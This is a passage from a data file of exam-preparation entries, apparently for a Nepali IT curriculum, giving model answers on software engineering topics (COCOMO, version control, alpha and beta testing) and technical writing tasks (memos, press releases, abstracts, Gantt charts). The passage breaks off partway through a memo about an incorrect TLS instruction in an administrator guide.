inputs, processing, outputs and error handling), performance, logical database, design constraints, and system attributes (reliability, availability, security, maintainability, portability).\n4. Appendices and index.\n\nGood requirements are unambiguous, complete, consistent, verifiable, traceable, feasible, prioritised and uniquely identified. Example: FR-12 'the system shall issue a book to a member with no unpaid fine'; NFR-03 'a search over 100,000 records shall complete within 2 seconds' — both testable and traceable. The SRS is baselined and changed only through change control."},"se-93":{"u":10,"logic":"Tests COCOMO as a usable procedure with constants and a substitution — the mark scheme rewards the arithmetic line, not the history.","how":"Formula, constants, a 33.6 KLOC worked example with effort, time and team size, then limitations; show every number.","skel":["Formulas E = a×KLOC^b, T = c×E^d","Modes: organic, semi-detached, embedded constants","33.6 KLOC semi-detached: 154 PM, 14.6 months","Team size and cost from the estimate","Limitations: size accuracy, calibration"],"ans":"COCOMO (Boehm) is an algorithmic model computing effort and duration from size in KLOC and project mode: E = a × (KLOC)^b person-months, T = c × E^d months. Basic COCOMO uses size and mode (organic, semi-detached, embedded); intermediate COCOMO multiplies effort by an effort adjustment factor from 15 cost drivers.\n\nExample: 33.6 KLOC semi-detached, a = 3.0, b = 1.12, c = 2.5, d = 0.35.\nE = 3.0 × 33.6^1.12 = 3.0 × 51.2 ≈ 154 person-months\nT = 2.5 × 154^0.35 = 2.5 × 5.8 ≈ 14.6 months\nTeam = 154 / 14.6 ≈ 10.6, so about 11 people; at Rs. 80,000 per person-month, cost ≈ Rs. 1.23 crore.\n\nProcedure: estimate size (function points or expert judgement), classify the mode, look up constants, compute effort, duration, team size and cost, then adjust with cost drivers. Limitations: accuracy depends on the size estimate, constants come from foreign historical data, and requirements volatility is ignored."},"se-94":{"u":7,"logic":"Checks that reuse is a disciplined strategy at several levels with real risks, not simply 'use libraries and save time'.","how":"Five levels of reuse with one line each, then the college-system example and three risks; the levels are the mark scheme.","skel":["Define reuse-based SE and its goal","Levels: application, component, object, design, concept","Example: framework, template and payment API","Process: assess, adapt, compose, test","Risks: mismatch, licensing, loss of control"],"ans":"Reuse-based software engineering builds systems systematically from existing artefacts instead of writing everything, so effort, cost and risk fall and proven quality is inherited. Reuse occurs at several levels:\n• Application system reuse: buy a package or product line (ERP, hospital management, Moodle) and configure it.\n• Component reuse: assemble libraries, frameworks and COTS components — payment gateway, chart library, authentication service.\n• Object and function reuse: standard libraries and APIs (Java collections, Python requests, SQL drivers).\n• Design and pattern reuse: architectural styles and GoF patterns.\n• Concept reuse: algorithms, standards and domain knowledge.\n\nExample: a Nepali college builds its result system on a PHP framework, a Bootstrap admin template, an open-source PDF library and the eSewa API; the team writes only marks-entry, grading and transcript logic, delivering in weeks.\n\nProcess: identify assets, assess fit and quality, adapt or wrap to the interface, compose and test. Risks: mismatch and glue code, loss of control over evolution, licensing (GPL versus MIT), hidden defects and vendor dependence."},"se-95":{"u":10,"logic":"Version control as a repeatable process ending in rollback; students describe Git commands instead of the process and its purpose.","how":"Seven numbered steps from repository to rollback, name the version identifier, then one line on centralised versus distributed.","skel":["Repository, baseline and unique version identifiers","Check out, edit, update, commit with a message","Branch, merge and resolve conflicts","Tag the release, archive it, roll back if needed","Centralised vs distributed tools"],"ans":"Version control records every change to every configuration item and lets any earlier version be retrieved. Process:\n1. Create a repository holding the current files and declare a baseline; each item gets a unique version identifier (a Git commit hash).\n2. Check out or clone a working copy and edit it locally.\n3. Update or pull before committing to take others' changes, resolving conflicts.\n4. Commit with a meaningful message linked to the change request; the tool stores the diff with author and time, creating a new version.\n5. Branch for parallel work — feature, bug-fix, release — and merge to the mainline after review and passing tests.\n6. Tag or label a release (v1.2) and archive it; a baseline becomes immutable.\n7. Roll back or revert if a change fails — the main reason version control exists.\n\nCentralised tools (SVN, CVS) keep one master copy on a server; distributed tools (Git, Mercurial) give every developer the full history and offline work. Example: a GitHub project with a protected main branch and one branch per feature. Version control underpins continuous integration and configuration audits."},"se-96":{"u":8,"logic":"Tests whether alpha and beta are separated by place, tester and control, not merely by 'before and after release'.","how":"Two definitions, then contrast location, tester, control, feedback, cost and purpose; add one fintech example.","skel":["Alpha: in-house, developers present, controlled","Beta: customer sites, real users, uncontrolled","Contrast location, tester, control, feedback, cost","Purpose: defect finding vs field validation","Fintech app example"],"ans":"Alpha and beta testing are two forms of user testing before release.\n\nAlpha testing is done in-house at the developer's site by the development team with internal staff or selected users, developers present to observe, record and fix defects at once. It is controlled, uses prepared data and sometimes a simulated environment, and is the last check before external exposure; feedback is fast and confidential.\n\nBeta testing is done at customers' sites by real users on real data, developers absent. The software goes to a limited beta group who report defects, and fixes appear in later releases; it is uncontrolled and hard to observe. Purpose: feedback from a large realistic user base, and checks of performance, compatibility and installation across many environments.\n\nDifferences: location (in-house versus customer site), tester (internal versus real user), control (controlled versus uncontrolled), feedback (immediate versus delayed), environment (simulated versus real), cost (low versus high), purpose (defect finding versus field validation).\n\nExample: a Nepali fintech app is alpha-tested by staff, then beta-released to 1,000 Play Store users before launch."},"tw-1":{"u":2,"logic":"Tests whether you can turn a definition into a usable tool. The examiner wants the three audience types plus a profile that reads like a real reader, not a generic list of adjectives.","how":"Define, list three audience types and six factors, then write the profile as six labelled bullets, one per factor. Keep the example mobile-first.","skel":["Define audience analysis in one line","Primary, secondary, tertiary readers","Six factors: knowledge, role, needs, attitude, context, constraints","Profile as labelled bullets for the banking manual","Close: how the profile changes the writing"],"ans":"Audience analysis is identifying who will read a document, what they already know and what they need from it, so that content, vocabulary, depth and format are matched to them.\n• Primary audience (acts on it) — account holders using the app.\n• Secondary (advises or approves) — branch staff, support agents.\n• Tertiary (incidental) — auditors, regulators.\nFactors: knowledge level, role, needs, attitude, reading context, constraints.\n\nAudience profile — Mobile Banking User Manual\n• Readers: existing customers, 18-65, mixed digital literacy; most use an Android phone.\n• Prior knowledge: can install apps and log in; do not know OTP, KYC or beneficiary.\n• Needs: reset password, add a payee, check charges, recover a failed transfer.\n• Attitude: anxious about money and fraud; want reassurance, not marketing.\n• Context: read on a small screen, often while a transaction is stuck.\n• Constraints: low bandwidth, Nepali or simple English, no jargon.\nSo: task-based headings, screenshots, numbered steps, 12-point sans-serif, a glossary, every acronym expanded once."},"tw-2":{"u":3,"logic":"Checks that you know the process is a cycle, not a straight line, and that you can attach a real IT artefact to each stage instead of reciting five names.","how":"Name the five stages in order, then one IT example each. Add the word recursive in the last line and say why.","skel":["Five stages in order","Planning: audience, purpose, outline, medium","Drafting fast, revising content, copyediting sentences","Publishing, feedback, archive","Recursive: revision loops back to planning"],"ans":"Technical writing follows five recursive stages; revision can send the writer back to planning.\n1. Planning — analyse audience and purpose, research, outline, choose medium. Example: before writing API docs for a payment gateway, list the three developer roles who will read it and choose a wiki, not a PDF.\n2. Drafting — write fast against the outline and never edit while drafting. Example: a first release note with [TBD] placeholders for version numbers.\n3. Revising — document level: content, accuracy, organisation, tone. Example: a tester shows that step 4 assumes admin rights, so the section is reordered.\n4. Copyediting — sentence level: grammar, spelling, consistent product names, style guide, wordiness. Example: utilise becomes use; login becomes log in as a verb.\n5. Publishing — format, proof, distribute, archive, collect feedback. Example: publish to the help centre, email the customer, close the ticket.\nIn practice a bug report may be drafted and published in an hour, but the same five questions are still asked."},"tw-3":{"u":5,"logic":"Separates design from decoration. The examiner is probing whether you can justify white space, headings and alignment as reader aids, with a cost when they are missing.","how":"Define design as visible structure, then one bullet per element with a document example. End on CRAP and the cost of a missed warning.","skel":["Design makes structure visible, not decoration","White space, headings, proximity and alignment","Contrast, repetition, typography","Lists, tables, graphics replace prose","Payoff: faster reading, fewer errors"],"ans":"Document design is the arrangement of text and visuals on a page so readers can find, understand and use information quickly; it makes structure visible.\n• White space and margins — separate blocks and rest the eye. A dense page of API parameters is unreadable until spaced into a list.\n• Headings and hierarchy — three levels let a reader jump straight to Troubleshooting.\n• Proximity and alignment — related items grouped, one left margin, so a form is scannable.\n• Contrast and repetition — bold for warnings, the same callout box for every caution, so the code is learned once.\n• Typography — serif for print body, sans-serif for screens; 10-12 point body with generous leading.\n• Lists and tables — a ten-step procedure becomes a numbered list; specifications become a table.\nDesign cuts reading time and error: a warning box that is missed becomes a support call or an accident. The test is CRAP — contrast, repetition, alignment, proximity."},"tw-4":{"u":1,"logic":"A basic definition question that separates people who memorised one sentence from those who can produce contrast points across purpose, audience, tone and success test.","how":"Write the two definitions in one sentence, then six contrast bullets, then a paired example. The example is the easiest mark.","skel":["One-line definition of each","Contrast purpose, audience, tone","Contrast structure, language","Contrast success test","Paired example: router guide vs poem"],"ans":"Technical writing communicates specialised information to a defined reader for a practical purpose; creative writing expresses feeling or imagination for a general reader.\n• Purpose — inform, instruct, persuade versus entertain and express.\n• Audience — specific, often non-expert versus general and self-selected.\n• Tone — objective and neutral versus emotional and personal.\n• Structure — headings, numbered steps, lists and visuals versus free form, plot and imagery.\n• Language — plain, literal, denotative versus figurative and connotative.\n• Success test — the reader completes the task without error versus the reader is moved.\n• Example — a router guide saying connect the blue cable to the WAN port, against a poem about rain.\nTechnical writing may be well styled, but style serves clarity, never the writer's self-expression."},"tw-5":{"u":7,"logic":"Tests two things at once: that you know the abstract-summary distinction and that you can actually produce an informative abstract with method, findings and conclusion, not a description of the report.","how":"Two-line definition, note descriptive versus informative, then write the abstract as a real document with numbers, findings and a keyword line.","skel":["Define abstract, descriptive vs informative","Title and one-line purpose","Method and sample","Three findings with figures","Conclusion and recommendation plus keywords"],"ans":"An abstract is a condensed, standalone summary placed at the start of a report, stating what was studied, how, and what was found. An informative abstract gives the findings; a descriptive one only lists what the report covers.\n\nAbstract\nThis study examined cybersecurity awareness among 240 undergraduate students of a Kathmandu campus in 2081, using a questionnaire and six follow-up interviews. Results show that 78 per cent reused one password across accounts, 61 per cent could not identify a phishing link, and only 22 per cent used two-factor authentication; awareness rose sharply among students who had attended one orientation session. The report concludes that one-off notices fail and recommends a compulsory first-semester session, monthly phishing simulations and a peer-led help desk.\nKeywords: cybersecurity awareness, phishing, password hygiene, campus students"},"tw-6":{"u":12,"logic":"Probes whether you see ethics as a condition of being believed rather than a list of virtues, and whether you can connect each value to a workplace consequence.","how":"Define ethics, then give six values each with a consequence, and close on trust. One Nepali or IT example is enough.","skel":["Define ethics as conduct where rules run out","Credibility and trust","Safety and legal duty","Fairness, credit, confidentiality","Culture is top-down; long-term interest"],"ans":"Ethics is the set of principles that guide right conduct where no written rule fully decides the case. In workplace communication it matters because words carry consequences for safety, money and reputation.\n• Credibility — a report that hides a defect destroys trust in every later report from that office.\n• Safety — inaccurate installation steps can injure a user or corrupt data.\n• Legal duty — false product claims invite liability and breach professional codes.\n• Fairness — credit for others' work, honest appraisal, no selective quoting.\n• Confidentiality — client data, salaries and security gaps are not shared casually.\n• Culture — managers who admit error get honest reports from staff.\nEthics is therefore not an ornament on communication but the condition for being believed."},"tw-7":{"u":7,"logic":"A production task: can you write the artefact, not describe it. Marks come from headline, dateline, lead answering the five Ws, a quote, boilerplate and contact.","how":"Write the release itself: headline, dateline with city and date, one-sentence lead, two short paragraphs, a quote, boilerplate and contact.","skel":["FOR IMMEDIATE RELEASE plus contact line","Headline with the news, not the company name","Dateline and lead answering who, what, when, where, why","Detail paragraph and one quote","About us boilerplate and ###"],"ans":"FOR IMMEDIATE RELEASE\nMedia contact: Sunita Rai, 01-4xxxxxx\n\nXYZ College Launches Cloud-Based Student Portal\n\nKathmandu, 12 November 2082 — XYZ College today launched MyCampus, a cloud-based portal giving 4,000 students online access to results, attendance, fee statements and timetables.\n\nThe portal replaces notice boards and administration queues. Students log in with their campus email, see marks within 24 hours of publication, and download transcripts without visiting the office.\n\n'Every student should check their record at midnight, not wait for a window to open,' said Principal Dr Bina Shrestha.\n\nMyCampus was built with the college IT unit, is hosted in Nepal with daily backups, and support runs 7 a.m. to 7 p.m. for the first month.\n\nAbout XYZ College: a Lalitpur college teaching science, management and computing since 2005.\n###"},"tw-8":{"u":5,"logic":"Checks the persuasion case for graphics: readers scan visuals first, and the right graphic reveals a pattern that a column of numbers hides. Also tests whether you know the honesty rules.","how":"One-line claim, then one bullet per job a graphic does with the matching chart, then the rules that keep it honest.","skel":["Prose numbers are slow and error-prone","Comparison, trend, proportion, process","Decision-makers read charts only","Rules: label axes, start bars at zero","Misleading graph is an ethical failure"],"ans":"Numerical data in prose is slow and error-prone; graphics make pattern, size and trend visible.\n• Comparison — a bar chart shows the month with the most downtime without comparing figures.\n• Trend — a line graph shows response time doubling over six months; a table of 24 numbers hides it.\n• Proportion — a pie chart shows 60 per cent of tickets come from one module.\n• Precision — a table gives exact values and units where the reader must calculate.\n• Process — a flowchart shows where a request is delayed.\nRules: one message per graphic, labelled axes with units, bars from zero, source cited, no 3-D effects and no truncated axis that exaggerates a difference. A misleading graph is an ethical failure, not a design choice."},"tw-9":{"u":4,"logic":"Tests memo format specifically: a memo has TO/FROM/DATE/SUBJECT and no salutation. Many students lose marks by writing it as an email or a letter.","how":"Write the memo block first, then purpose sentence, then what changes as numbered steps, why, and support. No Dear Sir, no Yours faithfully.","skel":["TO, FROM, DATE, SUBJECT block","Purpose in the first line","Numbered steps staff must take","Reason for the change","Training date, deadline, contact"],"ans":"MEMORANDUM\nTO: All Staff\nFROM: Rajesh Karki, Human Resources Manager\nDATE: 12 November 2082\nSUBJECT: Switch to the digital attendance system from 1 December\n\nFrom 1 December all staff will mark attendance on the AttendancePro app instead of the fingerprint register at the main gate.\n\nWhat changes\n1. Install AttendancePro and log in with your staff ID.\n2. Mark attendance on arrival and departure, from office Wi-Fi only.\n3. Arrival after 9:15 a.m. is flagged automatically; apply for leave in the app.\n\nWhy\nPaper registers lose entries and slow payroll; the app removes double entry and gives you your own record.\n\nTraining\nA 30-minute session runs on 27-28 November at 3 p.m. in Lab 2; bring your phone.\n\nInstall the app before 28 November; contact HR with any difficulty."},"tw-10":{"u":9,"logic":"Wants the components of effectiveness, not a story about a good speaker. Content, structure, visuals, delivery and rehearsal should each appear.","how":"Group into message, structure, visuals, delivery, rehearsal. One line each, and quote the 6x6 rule and 130 words per minute as free specifics.","skel":["One core message, repeated","Audience fit and 3-5 signposted points","Slides: 6x6 rule, 24-point type","Delivery: eye contact, pace, pauses","Rehearsal, backup copy, time control"],"ans":"An effective presentation delivers one clear message the audience remembers and can act on.\n• Single core message — state it in one sentence and repeat it at the close.\n• Audience fit — vocabulary, examples and depth matched to listeners.\n• Structure — hook, purpose, roadmap; three to five signposted points; a conclusion with a call to action.\n• Visual discipline — one idea per slide, the 6x6 rule, 24-point type, charts over dense tables.\n• Delivery — eye contact, about 130 words per minute, pauses, no reading from slides.\n• Rehearsal — timed practice out loud, a PDF backup, handouts ready.\n• Time control — finish inside the limit and leave room for questions.\nContent, design and delivery are judged separately; weakness in any one is visible."},"tw-11":{"u":5,"logic":"Tests graphic literacy: correct symbols, one flow direction, labelled decisions. The marks are for the shape of the chart, not the brilliance of the app idea.","how":"Name the app in one line, list the symbol key, then trace the flow top to bottom with Yes/No on every arrow.","skel":["Name the app and its one job","Symbol key: oval, rectangle, diamond","Main path: location to nearest bus","Two decision branches with Yes and No","Label arrows, add title and legend"],"ans":"Flow chart — CampusBus, a bus-tracking app for Kathmandu commuters.\nSymbols: oval = start/stop, rectangle = process, diamond = decision, parallelogram = input/output, arrow = flow.\n\nOval: Start\nParallelogram: Read GPS location and route number\nRectangle: Send location to server every 15 seconds\nParallelogram: Display nearest buses and arrival times\nDiamond: Route selected?\n  Yes → Rectangle: Show map with live bus positions → Diamond: Bus within 5 minutes?\n     Yes → Parallelogram: Send push alert → Oval: Stop\n     No → Rectangle: Show next two arrival times → Oval: Stop\n  No → Rectangle: Show search and popular routes → back to route selection\nDiamond: Network error? Yes → Parallelogram: Show last cached time and retry → Oval: Stop\nDraw one flow direction downward, label every arrow Yes/No, add a title and legend."},"tw-12":{"u":6,"logic":"The question is truncated, so it rewards the student who answers the four standard short notes from this syllabus instead of freezing. Each note is a definition plus a use.","how":"Treat it as four standard notes: inverted pyramid, 6x6 rule, AIDA, CRAP. Three lines each, and say where each is used.","skel":["Inverted pyramid: conclusion first","6x6 rule: six lines, six words","AIDA: attention, interest, desire, action","CRAP: contrast, repetition, alignment, proximity","One use case per note"],"ans":"Short notes\n• Inverted pyramid — the web and journalistic structure that puts the conclusion first: lead (who, what, when, where, why), then detail, then background. A reader who stops after two lines still gets the point, which suits scanning and search snippets.\n• 6x6 rule — no more than six lines per slide and six words per line, so the slide supports the speaker instead of competing. It forces one idea per slide and legible 24-point type.\n• AIDA — Attention (a hook), Interest (facts that concern the reader), Desire (benefits and evidence), Action (one easy next step). Used in proposals and news releases.\n• CRAP — Contrast (differences are obvious), Repetition (styles repeat), Alignment (nothing floats), Proximity (related items grouped)."},"tw-13":{"u":10,"logic":"Tests three layers: the definition, the report-versus-proposal distinction and the ability to produce a real evaluation with criteria before options. Hedging instead of recommending loses marks.","how":"One sentence on each genre, then write the report: problem, criteria, three options, conclusion, one recommendation. Use a criteria-first order.","skel":["Define recommendation report vs proposal","Problem and criteria","Three options, same criteria","Conclusion: costs close, integration decides","One recommendation with migration steps"],"ans":"A recommendation report analyses a problem, evaluates alternatives against stated criteria and recommends one course of action. A proposal asks for approval or money to do work. The report answers which option; the proposal answers may I proceed.\n\nRecommendation Report: Cloud Storage for a 50-Employee Business\nProblem: files sit on two local servers, email attachments exceed 25 MB, and there is no off-site backup.\nCriteria: cost per user per month, storage, security (2FA, encryption), collaboration, admin control, migration effort.\nAnalysis:\n• Google Drive — Rs 850 per user for 2 TB; strongest real-time collaboration; limited admin reporting.\n• Dropbox — Rs 950 per user for 2 TB; best sync reliability and version history; weaker document editing.\n• OneDrive — Rs 780 per user with 1 TB; native to the existing Microsoft 365 licences; best access control and audit logs.\nConclusion: costs are close; OneDrive wins on integration, admin control and least retraining.\nRecommendation: adopt OneDrive for all 50 accounts, migrate the shared drive over three weekends, enable 2FA and a retention policy, and review after three months."},"tw-14":{"u":3,"logic":"Asks for both sides of collaboration and a resolution strategy. Most answers list advantages only; the marks for challenges and conflict handling are what separate a 10 from a 6.","how":"Five stages in one line each, then advantages, challenges, and four conflict strategies. Give one documentation example at the end.","skel":["Five stages, collaborative version of each","Advantages: expertise, speed, review, buy-in","Challenges: voice, versions, free-riding","Conflict: style sheet, single editor, evidence","Example: four authors, one term per button"],"ans":"Planning, drafting, revising, copyediting, publishing. Collaboration changes how each stage runs, not the stages themselves.\nPlanning: one writer fixes purpose, audience and outline; sections and deadlines are assigned.\nDrafting: parts are written in parallel by whoever is closest to the knowledge — a developer writes the API reference, a tester the known issues.\nRevising: a comment-and-track-changes review cycle, where conflicts surface.\nCopyediting: one editor applies a single style sheet so the document reads in one voice.\nPublishing: one owner controls the final version and the archive.\n\nAdvantages: expertise coverage, speed, peer review, stakeholder buy-in.\nChallenges: coordination cost, inconsistent voice, version conflicts, free-riding, slow decisions.\nConflict resolution: agree outline and style guide before writing; give one editor final say on language; settle disputes by evidence and reader need, not seniority; escalate to the document owner with a deadline; log every decision in the shared file.\nExample: a manual by four authors fails when each names the same button differently — the style sheet is the fix."},"tw-15":{"u":6,"logic":"A structured production task. The examiner is checking that you cover all four requested areas as a proposal with sections, and that web rules like inverted pyramid, chunking and WCAG appear.","how":"Write it as a proposal with a header block and five numbered sections matching (a) to (d), plus deliverables. Bullets, not paragraphs.","skel":["Proposal header: author, duration, cost","Problem and purpose","Page organisation and content rules","Information architecture and SEO","Accessibility to WCAG 2.1 AA"],"ans":"Proposal: Website Redesign for [Company], Kathmandu\nSubmitted by: Web Content Manager. Duration: 10 weeks. Cost: Rs 6,50,000.\n\n1. Problem and purpose\nThe services page has a 68 per cent bounce rate and the site is unusable on a phone. Purpose: improve user experience, accessibility and search visibility.\n\n2. Organising and designing pages (a)\nOne page, one task. Five top-level navigation items, breadcrumbs, one template, mobile-first grid, visible calls to action, 16px body text, high contrast.\n\n3. Writing web content (b)\nInverted pyramid; keyword front-loaded headings; two-to-four-line paragraphs; bullets; active voice and second person (you can request a demo); descriptive link text; a meta title and description per page.\n\n4. Information architecture (c)\nCard-sort the 120 existing pages into services, solutions, case studies, about and contact; retire 40 obsolete pages; clean URLs such as /services/cloud-migration; redirect map and XML sitemap.\n\n5. Accessibility (d)\nWCAG 2.1 AA: keyboard navigation, 4.5:1 contrast, captions on demo videos, form labels, no colour-only meaning, screen-reader testing.\n\nDeliverables: content audit, sitemap, wireframes, 30 rewritten pages, accessibility report."},"tw-16":{"u":12,"logic":"A four-part question and most students answer only part one. Marks are distributed across dilemmas, the step sequence, and the organisational culture, so all four must appear.","how":"Split the page into four labelled blocks: importance, dilemmas, steps, culture. Two lines each and number the steps.","skel":["Importance: trust and safety","Four IT dilemmas in one line each","Seven steps from recognition to review","Escalate in writing, refuse to sign","Culture: code, training, protection, incentives"],"ans":"Ethics is the set of principles guiding right conduct where rules run out. In technical writing it decides whether a document can be trusted, and trust is the only reason a reader follows instructions.\nDilemmas in IT:\n• A release note must ship tonight but a known data-loss bug is undocumented.\n• A vendor pressures you to delete an unfavourable benchmark from an evaluation.\n• A manager wants a breach described as a minor incident.\n• Copying a competitor's documentation, or reusing a colleague's text without credit.\n\nSteps when confronted:\n1. Recognise and name the issue. 2. Gather facts, logs and test results. 3. Identify stakeholders and who is harmed. 4. Check the code of conduct, contract and law. 5. Escalate in writing to the supervisor and keep a record. 6. Refuse to sign inaccurate content and propose a corrected version. 7. Review the outcome.\n\nCulture of ethics: a written code, leaders who admit error, regular training, protected whistleblowing, incentives for accuracy, and real consequences for violation."},"tw-17":{"u":1,"logic":"A three-way comparison rather than the usual two-way. Weak answers forget academic writing, or list characteristics without saying why they matter professionally.","how":"Three definitions in one sentence, six contrast rows, then four unique characteristics of technical writing. Keep the rows parallel.","skel":["Define all three in one sentence","Contrast purpose, audience, tone","Contrast structure, evidence, success test","Unique: usability test of quality","Unique: standard formats, collaboration, accountability"],"ans":"Technical writing informs or instructs a defined reader for a practical purpose; academic writing argues a case for specialist peers; creative writing expresses imagination for a general reader.\n• Purpose — task completion versus contributing knowledge versus entertainment.\n• Audience — lay or mixed versus expert peers versus general.\n• Tone — objective versus formal and analytical versus personal and figurative.\n• Structure — headings and steps versus IMRaD versus free form.\n• Evidence — tested procedure versus citations versus imagery.\n• Success — the reader performs the task versus peers accept versus the reader feels.\nUnique to technical writing: usability is the test of quality; a known reader is addressed; standard formats (memo, manual, proposal) are used; it is collaborative and version-controlled; and the writer is accountable for accuracy."},"tw-18":{"u":2,"logic":"Tests the consequence chain: audience affects purpose, scope and medium. Most students only say language becomes simpler, which misses three of the marks.","how":"Define in one line, then one bullet each for purpose, scope, medium and style, then the two-audience IT example.","skel":["Define audience analysis briefly","Purpose changes with the reader's task","Scope narrows for novices, widens for experts","Medium follows access and context","IT example: customer guide vs API reference"],"ans":"Audience analysis is identifying who reads a document, what they know and what they must do, so content, scope and medium fit them.\n• Purpose — for a lay reader the purpose becomes enable a refund request; for a database administrator it is document the recovery procedure. Same system, different purpose.\n• Scope — experts need edge cases and configuration limits; novices need the happy path only, so depth and length drop.\n• Medium — a warehouse team with no desk needs a laminated card or video; developers need a searchable wiki; managers need a two-page PDF.\nIT example: one password-reset feature is written as three numbered steps with screenshots for customers, and as an API call with error codes for integrators. A single version serves neither."},"tw-19":{"u":5,"logic":"Tests whether you can read a schedule and convert it into a graphic with dependencies and milestones. The marks are for the bars, the arrows and the diamonds, not for prose about Gantt charts.","how":"Draw 12 week columns and five phase rows, then list each bar with its weeks, its dependency and one milestone. Name five milestones.","skel":["Twelve week columns, five phase rows","Requirements W1-2, design W3-4","Development W5-9, testing W10-11","Deployment W12","Five milestones as diamonds with arrows"],"ans":"Gantt chart — Mobile App Development, 12 weeks.\nDraw 12 columns (W1-W12) as the timeline, one row per phase, bars for duration, diamonds for milestones.\n• Requirement gathering — W1-W2. M1: signed requirement document, end W2.\n• UI/UX design — W3-W4, depends on M1. M2: approved prototype, end W4.\n• Development — W5-W9, depends on M2. Backend W5-W8, frontend W6-W9. M3: feature-complete build, end W9.\n• Testing — W10-W11, depends on M3. M4: UAT sign-off, end W11.\n• Deployment — W12, depends on M4. M5: live release, end W12.\nDependencies: arrows M1 to design, M2 to development, M3 to testing, M4 to deployment. Documentation overlaps testing by a week. Protect the two-week testing window and compress development instead."},"tw-20":{"u":3,"logic":"Tests whether you know the three review stages are different jobs at different times. Students who treat copyediting and proofreading as synonyms lose half the marks.","how":"Define copyediting and publishing in two lines, then a three-row contrast, then state the correct order as a chain.","skel":["Copyediting: sentence level against style guide","Publishing: format, proof, distribute, archive","Proofreading: typeset proof, typos only","Peer review: technical accuracy by specialists","Order: revise, review, copyedit, proofread, publish"],"ans":"Copyediting is the sentence-level stage after revision: grammar, punctuation, spelling, capitalisation, consistent terminology, house style, wordiness, and checking cross-references and captions. It assumes the content is settled. Publishing is the final stage: apply the template, place figures and page numbers, proof the PDF, distribute through the right channel, archive the master copy and collect feedback.\n• Copyediting — fixes language against a style guide, before layout is frozen.\n• Proofreading — the last check of the typeset proof for typos, broken links and wrong figure numbers; changes nothing substantive.\n• Peer review — specialists judge technical accuracy and method; may send the draft back to revision.\nOrder: revise, peer review, copyedit, proofread, publish. Each catches a different class of error."},"tw-21":{"u":8,"logic":"Three demands in one question: compare, advise when to use each, and produce a resume fragment. Many candidates write the comparison and skip the sample, losing the easiest marks.","how":"Two definitions, four bullets of contrast, one line on when to use each, then a short functional resume extract with three skill headings.","skel":["Chronological: reverse time order","Functional: skills grouped, dates hidden","Use chronological for steady relevant careers","Use functional for gaps and career change","Sample: three skill headings with results"],"ans":"A chronological resume lists experience in reverse time order; a functional resume groups achievements under skill headings and hides dates.\n• Chronological — shows progression, ATS-friendly, preferred by recruiters; weak with gaps or career change.\n• Functional — highlights transferable skills and hides gaps; risks looking evasive and is harder for ATS to parse.\n• Chronological for a steady, relevant career; functional for a career switch or a long gap.\n• Best practice is a combination: skills summary on top, short history below.\n\nFunctional Resume (extract) — Technical Writer\nSkills\n• Document design — restructured a 90-page manual into task topics; support tickets fell a third.\n• Tools — MadCap Flare, Markdown, Git, Jira.\n• API documentation — OpenAPI reference for 40 endpoints with examples.\nEducation: B.Sc. CSIT, Tribhuvan University."},"tw-22":{"u":6,"logic":"Tests information architecture as a concept plus page-type-specific writing. Generic web advice without homepage, product and FAQ specifics will not score.","how":"Define IA and its tools, then three bullets, one per page type, each with a concrete rule. Close on shared rules.","skel":["Define IA: grouping, labelling, navigation","Built with audit, card sort, sitemap","Homepage: value proposition, one action","Product page: benefit, bullets, CTA","FAQ: real questions, 40-60 word answers"],"ans":"Information architecture is the organisation, labelling and navigation of a site — how content is grouped, named and linked so users find things without thinking. It is built with content audits, card sorting and sitemaps.\n• Homepage — one value proposition, one primary action, five or fewer top-level links. A Nepali software company's homepage says what it builds and offers a demo button, not its history.\n• Product page — front-load the benefit, then feature bullets, a specifications table, pricing, one call to action, and answers to three common objections.\n• FAQ page — real questions in the user's wording, grouped by task, each answer 40-60 words with a link to the full topic, updated from support tickets.\nShared rules: consistent labels, breadcrumbs, search, short URLs, mobile-first, alt text."},"tw-23":{"u":7,"logic":"A persuasive release under a word limit with a named structure. The examiner checks the inverted pyramid physically: the most important sentence must be first, and hype must be absent.","how":"Headline, dateline, a lead with product, function, price and audience, then proof, a quote, availability, boilerplate. Stay under 300 words.","skel":["Headline naming product and benefit","Dateline and lead with price and audience","Pilot evidence with numbers","One customer-facing quote","Availability, about us, media contact"],"ans":"FOR IMMEDIATE RELEASE\n\nSentinel Nepal Launches SentinelShield to Stop Phishing Before the Click\n\nKathmandu, 12 November 2082 — Nepali cybersecurity firm Sentinel Nepal today launched SentinelShield, email and endpoint protection against phishing, ransomware and credential theft for small firms at Rs 350 per user per year.\n\nIt scans inbound mail, quarantines suspicious links before they open, and blocks ransomware from writing to shared drives. In a six-month pilot with 12 organisations and 3,000 mailboxes, it flagged 4,100 malicious messages and cut phishing clicks by 71 per cent.\n\n'Most breaches start with one forwarded email,' said CTO Anil Gurung. 'We wanted protection a 30-person office can install in an afternoon.'\n\nIt installs in under an hour, includes a Nepali dashboard and local support; a 30-day trial is at sentinelshield.com.np.\n\nMedia contact: [name], [email]. ###"},"tw-24":{"u":5,"logic":"Two skills in one: design principles and graphic selection. The examiner wants a reason for each choice, since choosing a table where a line graph belongs is the common error.","how":"Six principles as bullets, then five graphic types each with the data job and one example. End with the wrong-choice test.","skel":["One message per graphic, self-explanatory","Axes labelled with units, bars from zero","Table for precise values","Bar for comparison, line for trend","Flowchart for process, infographic for public story"],"ans":"Principles: one message per graphic; the right type for the data; a self-explanatory title; labelled axes with units; bars from zero; consistent colour; no 3-D distortion; source cited; a caption stating the point; alt text; placed beside the text it supports.\n• Table — precise values across many variables: server specifications, a price list.\n• Bar chart — comparison across categories: support tickets by module this month.\n• Line graph — trend over time: average page load time by week.\n• Flowchart — process and decisions: the loan approval workflow.\n• Infographic — a mixed public story: a year of cyber attacks in Nepal, with a map, figures and icons.\nWrong-choice test: if the reader must compare numbers mentally, use a table; if they must see a shape, use a chart."},"tw-25":{"u":12,"logic":"Tests ethical courage in memo form. Marks come from stating the risk precisely, quantifying exposure, and giving a dated, ordered corrective plan rather than an apology.","how":"Memo block, then Problem, Exposure, Recommended action as numbered steps, and one line offering to do the work. Keep it factual.","skel":["Memo block with URGENT subject","State the wrong instruction and the risk","Quantify exposure: downloads, confirmations","Four numbered corrective actions with owners","Offer to draft the correction today"],"ans":"MEMORANDUM\nTO: Prakash Adhikari, Director of Engineering\nFROM: [Your Name], Technical Writer\nDATE: 12 November 2082\nSUBJECT: URGENT — incorrect safety information in the v3.2 administrator guide\n\nProblem\nPage 47 of the 3.2 Administrator Guide says the Disable TLS verification option is safe for production. This is wrong: disabling verification allows a man-in-the-middle attack, and any deployment that followed the guide is exploitable.\n\nExposure\nIt was downloaded by 340 customers; 